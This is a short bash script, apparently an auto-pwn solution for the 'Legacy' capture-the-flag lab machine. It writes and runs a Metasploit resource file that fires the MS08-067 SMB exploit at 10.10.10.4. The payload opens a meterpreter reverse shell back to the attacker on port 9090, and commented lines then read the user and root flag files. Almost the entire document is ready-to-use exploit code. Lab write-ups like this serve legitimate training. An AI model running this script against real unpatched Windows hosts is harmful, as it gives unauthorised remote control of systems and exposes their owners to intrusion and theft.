### Auto-Pwn
### Legacy - Easy Windows
### By baX

#!/bin/bash

cat <<EOF > /tmp/legacy.rc
use windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set RPORT 445
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9090
exploit
EOF

msfconsole -r /tmp/legacy.rc

# cat 'c:/documents and settings/john/Desktop/user.txt'
# cat 'c:/documents and settings/Administrator/Desktop/root.txt'